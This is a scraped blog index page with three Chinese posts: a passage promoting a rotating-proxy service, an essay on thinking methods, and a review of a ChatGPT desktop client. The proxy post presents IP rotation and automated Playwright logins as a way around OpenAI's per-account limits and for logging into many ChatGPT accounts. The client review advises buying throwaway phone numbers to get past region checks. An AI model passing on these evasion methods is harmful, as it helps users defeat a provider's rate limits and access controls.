handler)</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中，<code>http_proxy</code> 参数可以设置为我们前面提到的隧道代理。例如：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">"http://mAZFcgDR-zone-custom-region-us:&lt;password&gt;@na.ipidea.io:2336"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样，我们就成功地将 IPIDEA 的隧道代理进行了设置。</p>
                  <p>一旦服务运行起来，由于代理本身是全球动态或者动态数据中心，因此里面的代理 IP 会动态变化。这样，对于单个账号来说，每次请求 OpenAI 的 IP 都在变化，就可以解除单个账号访问的限制。</p>
                  <blockquote>
                    <p>注意：我请求 OpenAI 是用的<code>access_token</code>的方式，目前并不会造成账号被封的问题。</p>
                  </blockquote>
                  <h2 id="动态长效-ISP"><a href="#动态长效-ISP" class="headerlink" title="动态长效 ISP"></a>动态长效 ISP</h2>
                  <p>我们刚才讨论了通过 API 请求方式的隧道代理设置，这种方式相对方便。但在某些情况下，我们实际上想要的是更稳定、长效的代理，即动态长效 ISP。</p>
                  <p>我通常会将这种代理用于一些模拟登录服务。由于我需要使用浏览器进行这些服务，如果我将浏览器设置为一个动态切换的隧道代理，那么在一次网页请求中，所有请求的 IP 地址都可能是不同的。因此，我们实际上希望在同一浏览器会话下，IP 地址能够保持相对稳定。</p>
                  <p>于是，动态长效 ISP 就能派上用场。我通常使用模拟浏览器驱动的方式来启动浏览器，然后动态设置代理 IP 为动态长效 ISP。设置完成后，我便可以启动浏览器进行网页模拟，比如登录模拟 GPT 网站等。</p>
                  <p>下面是一个简单的 Playwright 的代理设置样例：</p>
                  <figure class="highlight bash">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def init_browser(self):</span><br><span class="line">    self.browser = p.chromium.launch(headless=False, proxy=&#123;</span><br><span class="line">        <span class="string">'server'</span>: <span class="string">"http://proxy.ipidea.io:2336"</span>,</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"mAZFcgDR-zone-isp-session-2146kz42f-sessTime-5"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"&lt;password&gt;"</span></span><br><span class="line">    &#125;)</span><br><span class="line">    self.page = self.browser.new_page()</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>浏览器设置完成后，我就可以执行一些自动化操作，比如模拟登录 ChatGPT、模拟登录其他网站等。在这个过程中，我几乎没有遇到不可用的情况，可用率非常高。</p>
                  <p>有了这个动态长效 ISP，我成功完成了大量 ChatGPT 账号的模拟登录过程，可谓是非常方便！</p>
                  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
                  <p>好了，到这里我这篇文章就接近尾声了。</p>
                  <p>我们来回顾下这篇文章的内容，首先对 IPIDEA 做了基本介绍，然后介绍了基本的使用方法以及我自己的使用体验。</p>
                  <p>整个体验下来我觉得还是挺顺的，没有遇到什么无法访问的时候，整个访问速度也不错。</p>
                  <p>如果你也有海外代理的需求，我非常建议你也来试试看。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2023-05-29 22:54:53" itemprop="dateCreated datePublished" datetime="2023-05-29T22:54:53+08:00">2023-05-29</time>
                </span>
                <span id="/36066.html" class="post-meta-item leancloud_visitors" data-flag-title="分享一个稳定好用的国外代理" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>4k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>4 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/cme79jr6l013ljq6scl0jgbd6.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a href="/cme79jr6l013ljq6scl0jgbd6.html" class="post-title-link" itemprop="url">元思考:对思考的思考</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>思考， 简单却有困难的词。它离我们“近在咫尺”却又似乎“远在天涯”。那究竟什么叫思考？什么是思考？那么该如何思考？</p>
                  </blockquote>
                  <h2 id="思考的定义"><a href="#思考的定义" class="headerlink" title="思考的定义"></a>思考的定义</h2>
                  <p>说到思考， 那咱们也不得不对其进行追本溯源， 去揪一下它的细节。什么是<strong>思、</strong>什么是<strong>考、</strong>什么是<strong>思考</strong><br>思，汉语一级字，读作sāi或sī，在指“心情”等时旧读为sì，最早见于金文，其本义是深想、考虑，由此引申出怀念、悲伤、意念、创作的构想等。《说文解字》认为是“容也”。<br>考（拼音：kǎo）是汉语通用规范一级字（常用字）。在甲骨文和金文中，考和老是同一个字，均像一老人举杖之形。考字用为年老之义，从商代经西周一直延用至于春秋战国时代。<br>先秦时“考”常用作对父亲的称呼，可以指在世的，也可以指去世的。<br>现代汉语的“考”多用于考察、考核，又表示研究、推求。这些都是后来出现的假借义，与考的本义无关。<br>那什么是思考呢？由上可知思就是深想，考虑就是验证， 二者形成闭环故为思考。那么思考就是，就是<br><strong>思考就是考虑与验证的过程！</strong><br>btw</p>
                  <ul>
                    <li>考虑在此的意思是检索，检索已有的知识。</li>
                    <li>验证在此的意思是过滤，过滤检索的知识。</li>
                  </ul>
                  <p>先split再merge，那就是答案啊</p>
                  <p>思考是思维的一种探索活动，思考力则是在思维过程中产生的一种具有<strong>积极性和创造性</strong>的作用力。<br>思考源于主体对<strong>意向信息</strong>的加工。人之思考是<strong>自己心智对意向——信息内容的加工过程</strong>。任何思考的进行都是在<br><strong>联想—连锁反映中进行的推理与演算</strong>——信息内容的加工。如：相似联想、接近联想、对比联想、因果联想等理解来进行思考是必然的。</p>
                  <h2 id="思考流程"><a href="#思考流程" class="headerlink" title="思考流程"></a>思考流程</h2>
                  <p>由上可知， 思考流程是检索 -&gt; 验证 -&gt; 加工(排列组合) =&gt; 结果。需要注意的是检索与验证并不是仅是单次的，也可以是多次。</p>
                  <h3 id="论3-4的思考过程"><a href="#论3-4的思考过程" class="headerlink" title="论3 * 4的思考过程"></a>论3 * 4的思考过程</h3>
                  <p>是如何计算出来的呢？ 当然，各位早就知晓了答案， 不就是12嘛。 浪费表情，so easy, 摊手🤷</p>
                  <p><img src="https://cdn.nlark.com/yuque/__latex/3e90b256052522b05fd06968b19b78a3.svg#card=math&amp;code=3%20%2A%204%0A&amp;id=SYVLR" alt=""><br>思考过程如下三种情况所示</p>
                  <ol>
                    <li>无法理解数字3、乘以✖️、数字4的含义。 思考失败</li>
                    <li>理解数字3、乘以✖️、数字4的含义，回归原始。点阵图数数来解决<ol>
                        <li>建立横竖轴（x、y）</li>
                        <li>x轴放三个点点·,y轴放四个点点·(见代码片段-1)</li>
                        <li>一个一个数， 是12诶！</li>
                      </ol>
                    </li>
                  </ol>
                  <figure class="highlight html">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">· · ·</span><br><span class="line">· · ·</span><br><span class="line">· · ·</span><br><span class="line">· · ·</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <ol>
                    <li>学会乘法， 知道乘法表（嘿嘿，回来。你已经会背乘法口诀表啦！）。直接三四一十二，perfect</li>
                  </ol>
                  <h4 id="复盘-3-4"><a href="#复盘-3-4" class="headerlink" title="复盘 3 * 4"></a>复盘 3 * 4</h4>
                  <p>在上面对<img src="https://cdn.nlark.com/yuque/__latex/be1f45951ef7d08436b379402ebfa9ec.svg#card=math&amp;code=3%20%2A4&amp;id=GOAXB" alt=""><br>的各种假设的可能性进行了推延生与证明。相信在此时你也和笔者一样又有新的疑问了， 3* 4 不是我们数(算)<br>出来的嘛？不是，在这之前存在一些“可选”项<br>对， 是思考出来的。 流程如下<br><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/22806252/1675183092904-cf89b109-6773-4bab-b538-5e0a9870f8c1.jpeg" alt=""></p>
                  <h4 id="拓展：计算机“思考”过程"><a href="#拓展：计算机“思考”过程" class="headerlink" title="拓展：计算机“思考”过程"></a>拓展：计算机“思考”过程</h4>
                  <ol>
                    <li>书写代码（在此省略代码编写的种种）</li>
                    <li>计算机进行“思考”<ol>
                        <li>思：编译(将代码转化成计算机可理解的“知识”)。（编译过程，在此不过多赘述），</li>
                        <li>考：验证编译</li>
                      </ol>
                    </li>
                    <li>加工(位运算)</li>
                    <li>得到结果</li>
                  </ol>
                  <h4 id="题外话：人与计算机的思维差异"><a href="#题外话：人与计算机的思维差异" class="headerlink" title="题外话：人与计算机的思维差异"></a>题外话：人与计算机的思维差异</h4>
                  <p>人：“聪明”，但<strong>加工</strong>慢<br>计算机：“愚昧”， 但加工快。快速的准确的yes or no， for loop</p>
                  <blockquote>
                    <p>所以，该如何写出“多快好省”的代码呢？尝试二者结合试试</p>
                  </blockquote>
                  <h3 id="谈谈想象力或创造力"><a href="#谈谈想象力或创造力" class="headerlink" title="谈谈想象力或创造力"></a>谈谈想象力或创造力</h3>
                  <p>其本质还是思考</p>
                  <ol>
                    <li>检索</li>
                    <li>验证</li>
                    <li>加工(排列组合)</li>
                  </ol>
                  <h4 id="例子：钢铁侠"><a href="#例子：钢铁侠" class="headerlink" title="例子：钢铁侠"></a>例子：钢铁侠</h4>
                  <p>这世界本没有钢铁侠，只是有人给他创造，想象了出来，并赋予其名。<br>zoom out(宏观角度): 钢铁(科技与狠活) + 人(侠)<br>zoom in(微观角度)：类似于计算机，譬如ACR核反应堆(类似于电脑的电) 、贾维斯(人工智能) 等等</p>
                  <h2 id="提高思考力？"><a href="#提高思考力？" class="headerlink" title="提高思考力？"></a>提高思考力？</h2>
                  <blockquote>
                    <p>思考力：即思考的能力</p>
                  </blockquote>
                  <p>由上可知，思考能力的强弱取决于两部分。</p>
                  <ol>
                    <li>已有背景知识的存量</li>
                    <li>梳理加工过滤的能力</li>
                  </ol>
                  <p>那么对此，我们可以得出。得出提高思考力的方法</p>
                  <ul>
                    <li>增加知识的存量质与量<ul>
                        <li>量： 拥有更多的知识<ul>
                            <li>输入-&gt; 学习、思考 -&gt; 化为己用</li>
                          </ul>
                        </li>
                        <li>质<ul>
                            <li>建立连接：学习并非单纯的记忆，而是连接。旧知识 + 新知识 =&gt; 新认知</li>
                            <li>点-线-面-体-势，知识结构化，建立有关联的<strong>强链接</strong><br>，让提取的知识不在是点而是线、是面、是体、甚至是势。不在有知识孤岛，也让思考更加开阔不在局限</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                    <li>增强梳理“过滤”能力<ul>
                        <li>随意搭配-&gt; 创造力<ul>
                            <li>加减乘除，排列组合</li>
                          </ul>
                        </li>
                        <li>套路搭配 -&gt; 方法论<ul>
                            <li>怎么切、怎么分 流程与关键节点</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                  </ul>
                  <h3 id="case-by-case-构建思考框架"><a href="#case-by-case-构建思考框架" class="headerlink" title="case by case: 构建思考框架"></a>case by case: 构建思考框架</h3>
                  <p>经过对于其的整合梳理，我们不难得到可复用的方法论。常见的方法如下</p>
                  <p>逻辑推理：三段论<br>高效沟通：PREP法则<br>工作总结：AEAP<br>创业计划：商业模式画布<br>工作规划：SMART原则<br>质量管理：PDCA原则</p>
                  <h3 id="学习能力"><a href="#学习能力" class="headerlink" title="学习能力"></a>学习能力</h3>
                  <ul>
                    <li>学习金字塔</li>
                    <li>费曼学习法</li>
                    <li>刻意练习</li>
                    <li>RIA阅读法</li>
                    <li>二八定律</li>
                  </ul>
                  <h3 id="思考能力"><a href="#思考能力" class="headerlink" title="思考能力"></a>思考能力</h3>
                  <ul>
                    <li>黄金圈法则</li>
                    <li>八何分析法（5w3h、6w2h）</li>
                    <li>思维导图</li>
                    <li>策略选择：SWOT分析</li>
                    <li>梳理信息：MECE法则</li>
                    <li>10/10/10法则</li>
                    <li>冰山模型</li>
                  </ul>
                  <h3 id="创造能力"><a href="#创造能力" class="headerlink" title="创造能力"></a>创造能力</h3>
                  <ul>
                    <li>六顶思考帽</li>
                    <li>头脑风暴</li>
                    <li>逆向思维</li>
                    <li>类比思维</li>
                    <li>SCAMPER创新思维</li>
                  </ul>
                  <h3 id="设计能力"><a href="#设计能力" class="headerlink" title="设计能力"></a>设计能力</h3>
                  <ul>
                    <li>设计思维</li>
                    <li>最小可行性产品（MVP）</li>
                    <li>峰终定律</li>
                    <li>AARRR漏斗模型</li>
                    <li>上瘾（HOOK）模型</li>
                  </ul>
                  <h3 id="共情能力"><a href="#共情能力" class="headerlink" title="共情能力"></a>共情能力</h3>
                  <ul>
                    <li>五大圈层模型</li>
                    <li>高效倾听模型</li>
                    <li>情绪ABC模型</li>
                    <li>乔哈里视窗</li>
                    <li>冰山模型</li>
                  </ul>
                  <h3 id="演讲能力"><a href="#演讲能力" class="headerlink" title="演讲能力"></a>演讲能力</h3>
                  <ul>
                    <li>故事五要素</li>
                    <li>结构表达: SCQA原则</li>
                    <li>结构阐述：STAR原则</li>
                    <li>SRAR模型</li>
                    <li>STORY模型</li>
                    <li>“英雄之旅”模型</li>
                  </ul>
                  <h3 id="领导能力"><a href="#领导能力" class="headerlink" title="领导能力"></a>领导能力</h3>
                  <ul>
                    <li>领导力梯队</li>
                    <li>情景领导力模型</li>
                    <li>GROW教练模型</li>
                    <li>管理4C模型</li>
                    <li>TOPIC模型</li>
                  </ul>
                  <h3 id="整合能力"><a href="#整合能力" class="headerlink" title="整合能力"></a>整合能力</h3>
                  <ul>
                    <li>杠杆思维</li>
                    <li>POA行动</li>
                    <li>系统思维</li>
                    <li>整合思维模型</li>
                    <li>多元思维模型</li>
                  </ul>
                  <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2>
                  <p><strong>既要有“底层逻辑”也要有“顶层设计”。</strong></p>
                  <p>事物间的共同点，就是底层逻辑。只有不同之中的相同之处、变化背后不变的东西，才是底层逻辑。<br>只有底层逻辑，才是有生命力的。只有底层逻辑，在我们面临环境变化时，才能被应用到新的变化中，从而产生适应新环境的方法论。所以我们说“底层逻辑+环境变量=方法论”</p>
                  <p><strong>以终为始，目标导向。</strong><br>如论是如何思考，何种方法论。最终都是为“问题”所服务的， 切勿<strong>拿着锤子看什么都是钉子！</strong>这并非此文的本意。<br>上述关于“如何思考” 阐述是微观，那么也希望你也能站在更顶层层次看待anythings</p>
                  <h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2>
                  <ul>
                    <li><a href="https://baike.baidu.com/item/%E6%80%9D/53644" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%80%9D/53644</a></li>
                    <li><a href="https://baike.baidu.com/item/%E8%80%83" target="_blank" rel="noopener">https://baike.baidu.com/item/%E8%80%83</a></li>
                    <li><a href="https://baike.baidu.com/item/%E6%80%9D%E8%80%83" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%80%9D%E8%80%83</a></li>
                    <li><a href="https://www.zhihu.com/zvideo/1441425516532748288" target="_blank" rel="noopener">如何才有高效的思考能力</a></li>
                    <li><a href="https://zhuanlan.zhihu.com/p/379832851" target="_blank" rel="noopener">人人都能变聪明的四个“核武器”</a></li>
                    <li>《底层逻辑》</li>
                    <li>《麻省理工深度思考法》</li>
                  </ul>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/Payne" class="author" itemprop="url" rel="index">Payne</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2023-02-25 00:24:54" itemprop="dateCreated datePublished" datetime="2023-02-25T00:24:54+08:00">2023-02-25</time>
                </span>
                <span id="/cme79jr6l013ljq6scl0jgbd6.html" class="post-meta-item leancloud_visitors" data-flag-title="元思考:对思考的思考" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36065.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36065.html" class="post-title-link" itemprop="url">推荐一个方便好用的 ChatGPT 客户端</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>这段时间，想必大家肯定早就领教过 ChatGPT 的威力了吧。</p>
                  <p>我们跟它说各种内容，比如写代码、汇总周报、写邮件、写诗句、查百科什么的，ChatGPT 都对答如流，根本不在话下。</p>
                  <p>比如说让它基于 Vue3 写一个 div 的拖拽实现，思路清晰，代码正确：</p>
                  <p><img src="https://cdn.cuiqingcai.com/64yol.png" alt=""></p>
                  <p>比如让它汇总和润色一个周报：</p>
                  <p><img src="https://cdn.cuiqingcai.com/el0t3.png" alt=""></p>
                  <p>写的还蛮“充实”的感觉的。</p>
                  <p>当然还有各种有趣的功能大家去 ChatGPT 继续试试吧～</p>
                  <p>那其实这次我要介绍的不是 GhatGPT，而是一个 ChatGPT 的客户端。</p>
                  <p>为什么要客户端呢？因为有了客户端我们就不用每次单独开一个浏览器，而且也不会迷失在无数的 TAB 里面了，而且客户端其实基于 ChatGPT 多了一些新的功能。</p>
                  <p>让我们来看看吧。</p>
                  <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2>
                  <p>开门见山，这个客户端的 GitHub 地址是：<a href="https://github.com/lencx/ChatGPT" target="_blank" rel="noopener" title="https://github.com/lencx/ChatGPT">https://github.com/lencx/ChatGPT</a>，支持 Mac、Windows、Linux。</p>
                  <p><img src="https://cdn.cuiqingcai.com/8geoi.png" alt=""></p>
                  <p>截止写文的时候，客户端已经更新到 0.7.0 版本，支持的功能有：</p>
                  <ul>
                    <li>多平台的支持，Mac、Linux、Windows</li>
                    <li>支持导出 ChatGPT 的历史，生成图片、PDF、分享连接</li>
                    <li>自动升级提醒</li>
                    <li>通用/全局快捷键</li>
                    <li>系统托盘设定</li>
                    <li>支持一些快捷命令和配置选项</li>
                  </ul>
                  <p>下面我们就来看看怎么搞吧。</p>
                  <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2>
                  <p>安装其实挺简单的，官网提供了下载安装包，大家可以到这里 <a href="https://github.com/lencx/ChatGPT#-downloads" target="_blank" rel="noopener" title="https://github.com/lencx/ChatGPT#-downloads">https://github.com/lencx/ChatGPT#-downloads</a> 选择自己平台的安装包下载安装。</p>
                  <p>我这边是 Mac，安装完了之后会有这样的一个图标：</p>
                  <p><img src="https://cdn.cuiqingcai.com/xnyjt.png" alt=""></p>
                  <p>打开之后需要让我们注册或登录 OpenAI 的账号。</p>
                  <p>界面和 <a href="https://chat.openai.com/" target="_blank" rel="noopener" title="https://chat.openai.com/">https://chat.openai.com/</a> 是一样的，因为客户端其实就是外包了一个网页而已：</p>
                  <p><img src="https://cdn.cuiqingcai.com/h0p78.png" alt=""></p>
                  <p>需要提醒下的是，如果你从来没用过 GhatGPT，在注册新账号的时候，有一步是验证手机号，这时候如果我们输入国内手机号会被提示“地区不被支持”。这时候建议开全局国外代理，并且使用国外手机号来完成验证。</p>
                  <p>这里推荐一个网站 <a href="https://sms-activate.org/" target="_blank" rel="noopener" title="https://sms-activate.org/">https://sms-activate.org/</a>，我们可以花一块钱左右买到一个 OpenAI 验证的手机号接收一次验证码。</p>
                  <p>搜索 OpenAI 服务，并选择对应地区即可，我选择的是马来西亚能成功接收到验证码（一开始选了一个印度的但没接收到验证码），而且也挺便宜的。</p>
                  <p><img src="https://cdn.cuiqingcai.com/zr2hk.png" alt=""></p>
                  <p>就是这样，希望大家能成功注册到一个 ChatGPT 账号。</p>
                  <h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2>
                  <p>接下来就是一些常规操作了，进入之后我们就可以输入各种文字来尝试 ChatGPT 了，比如：</p>
                  <p><img src="https://cdn.cuiqingcai.com/oh2wu.png" alt=""></p>
                  <p>这时候大家会说，这客户端和网页有啥不一样啊？网页也有这功能啊。</p>
                  <p>有的，看图里面，右侧的几个其实就是客户端多出来的功能，分别是生成分享图片、PDF 和链接。</p>
                  <p>比如我点一下“生成分享图片”的按钮，就可以生成这样的一个分享图，还蛮不错的：</p>
                  <p><img src="https://cdn.cuiqingcai.com/c5e37.png" alt=""></p>
                  <p>当然 PDF 也是一样的。</p>
                  <h2 id="快捷命令"><a href="#快捷命令" class="headerlink" title="快捷命令"></a>快捷命令</h2>
                  <p>当然我觉得客户端更好用的功能在于一个叫快捷命令的功能，我们可以输入一些命令，启用 ChatGPT 的一些功能。</p>
                  <p>首先，我们输入一个 <code>/</code> 就能激活快捷命令，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/73ggc.png" alt=""></p>
                  <p>我们可以看到，这里已经内置了好多个快捷命令，比如 poet、chef、rapper 等，代表了让 ChatGPT 实现的一些功能。</p>
                  <p>比如这里有一个 <code>/javascript_console</code> 的快捷命令：</p>
                  <p><img src="https://cdn.cuiqingcai.com/4612e.png" alt=""></p>
                  <p>选中之后输入框就会多这么一些文字：</p>
                  <blockquote>
                    <p>I want you to act as a javascript console. I will type commands and you will reply with what the javascript console should show. I want you to only reply with the terminal output inside one unique code block, and nothing else. do not write explanations. do not type commands unless I instruct you to do so. when i need to tell you something in english, i will do so by putting text inside curly brackets {like this}. my first command is console.log(“Hello World”);</p>
                  </blockquote>
                  <p>大意就是告诉 ChatGPT，我会告诉你一段 JavaScript 代码，你帮我执行并输入结果，然后我的第一个命令是一个 console.log 语句。</p>
                  <p>对，就是这样，直接发出去即可：</p>
                  <p><img src="https://cdn.cuiqingcai.com/cpwx4.png" alt=""></p>
                  <p>然后 ChatGPT 就会按照我们说的来执行了。</p>
                  <p><img src="https://cdn.cuiqingcai.com/u4960.png" alt=""></p>
                  <p>接着，由于 ChatGPT 有记忆功能，它能知道刚才我们让它干了什么。</p>
                  <p>所以接下来，我们就可以接着让它干事情了。</p>
                  <p>接着继续输入第二段代码，它就能接着继续输出了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/srof6.png" alt=""></p>
                  <p>是的，就是这个流程。</p>
                  <p>还有很多其他的功能，比如输入 <code>/poem</code> 作诗：</p>
                  <p><img src="https://cdn.cuiqingcai.com/idm8d.png" alt=""></p>
                  <p>接着我们输入新的作诗要求就可以了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/f0hed.png" alt=""></p>
                  <p>OK，这下大家应该理解了吧，我们利用了 ChatGPT 的上下文记忆功能，结合一些快捷键，就能快速让 ChatGPT 帮我们完成想要的事情了。</p>
                  <p>那所以，如果我们把想要 ChatGPT 做的工作都收录整理下来，那么以后是不是就能直接调用了。</p>
                  <p>比如说，我输入一个中文类别的命令 <code>/汇总周报</code>，然后描述好要让它帮我们做什么，接着就可以让它帮我们汇总周报了。</p>
                  <p>想的挺好，ChatGPT 客户端可以做到吗？可以！</p>
                  <p>我们通过 ChatGPT 的菜单里面打开 ‘Control Center’，就可以看到这样的一个配置界面：</p>
                  <p><img src="https://cdn.cuiqingcai.com/cyatj.png" alt=""></p>
                  <p>我们可以切换到 Language Model - User Custom 部分，这里我们就可以添加一些自定义指令了。</p>
                  <p>比如我这里点击 Add Model 按钮，添加这样的一个指令：</p>
                  <p><img src="https://cdn.cuiqingcai.com/b1bcc.png" alt=""></p>
                  <p>这里第一个 <code>/{cmd}</code> 就是我们到时候实际敲的命令，<code>Act</code> 就是对命令的一个描述，会出现在命令的描述里面，<code>Prompt</code> 就是告诉 ChatGPT 的话，这里我们需要详细描述一下需要 ChatGPT 做的事情，并给出一个示例。</p>
                  <p>编辑好了之后点击保存。</p>
                  <p>然后重启下 ChatGPT，这时候我们就可以输入 <code>/汇总周报</code> 命令了：</p>
                  <p><img src="https://cdn.cuiqingcai.com/cs9h3.png" alt=""></p>
                  <p>然后点击空格转换为实际的文字，然后发出去：</p>
                  <p><img src="https://cdn.cuiqingcai.com/uyr10.png" alt=""></p>
                  <p>OK，接下来我们就可以让它帮我们整理第二份周报了，而且第二次也不需要告诉他那么多前提了。</p>
                  <p><img src="https://cdn.cuiqingcai.com/sqril.png" alt=""></p>
                  <p>所以，到现在大家能体会到这个快捷指令的便捷用途了吧，我们可以提前录入好一些要求，然后第二次我们就无需赘述那么多要求，直接输入最直接的要求，ChatGPT 就可以帮我们完成其中的操作了。当然第一次的时候，我们也可以自行替换想要替换的输入文本，同样也可以达成想要的效果。</p>
                  <p>有人说？那我应该整理一些什么命令呢？都行呀，比如整理周报、起草邮件、写 Python 代码，都行。</p>
                  <p>这里给大家介绍一个资源，叫 awesome-chatgpt-prompts，GitHub 地址是： <a href="https://github.com/f/awesome-chatgpt-prompts" target="_blank" rel="noopener" title="https://github.com/f/awesome-chatgpt-prompts">https://github.com/f/awesome-chatgpt-prompts</a>，这里面汇总了各种快捷命令，大家也可以到里面寻找些灵感，也可以贡献命令到这个 Repo，这样命令就会被自动收录到 ChatGPT 这个客户端里面。</p>
                  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
                  <p>好了，这次给大家介绍了 ChatGPT 客户端的基本使用，想必 ChatGPT 网页来说，会有如下的几个优点：</p>
                  <ul>
                    <li>独立的窗口运行，不用每次单独打开浏览器，也不会迷失在茫茫的 TAB 里面。</li>
                    <li>带了额外的转换分享功能，比如生成图片、生成 PDF、分享链接等，这是网页所不具备的功能。</li>
                    <li>带了便捷的快捷命令功能，利用它我们可以快捷输入想要的命令，并且可以自己管理一些命令，已备后续之需。</li>
                  </ul>
                  <p>大家可以试用哈，希望这次分享对大家有帮助！</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-12-27 19:00:13" itemprop="dateCreated datePublished" datetime="2022-12-27T19:00:13+08:00">2022-12-27</time>
                </span>
                <span id="/36065.html" class="post-meta-item leancloud_visitors" data-flag-title="推荐一个方便好用的 ChatGPT 客户端" title="阅读次数">
